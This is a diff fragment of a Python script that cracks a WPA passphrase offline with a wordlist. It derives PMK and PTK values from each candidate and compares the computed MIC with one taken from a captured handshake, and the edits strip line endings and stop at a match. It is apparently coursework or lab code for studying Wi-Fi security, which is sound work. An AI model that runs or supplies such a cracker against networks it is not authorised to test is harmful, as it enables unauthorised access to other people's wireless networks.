@@ -37,10 +37,10 @@ if __name__ == '__main__':
 
     ssid = str.encode(ssid)
     data = raw(wpa[8])[0x30:0x81] + b"\x00" * 16 + raw(wpa[8])[0x91:0x93]
-    found = False
+
     for line in f :
-        if found:
-            break
+        line = line.replace("\r","")
+        line = line.replace("\n","")
         passPhrase = str.encode(line)
         pmk=b""
         # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
@@ -50,10 +50,8 @@ if __name__ == '__main__':
             pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
         ptk = customPRF512(pmk,str.encode(A),B)
         mic = hmac.new(ptk[0:16], data, hashlib.sha1)
-
         if a2b_hex(mic.hexdigest())[0:16] == mic_to_check:
-            found=True
-            print(line)
-
-        print(line)
+            print("GG ! : ",line)
+            break
+        print("tried : ", line)
     f.close()
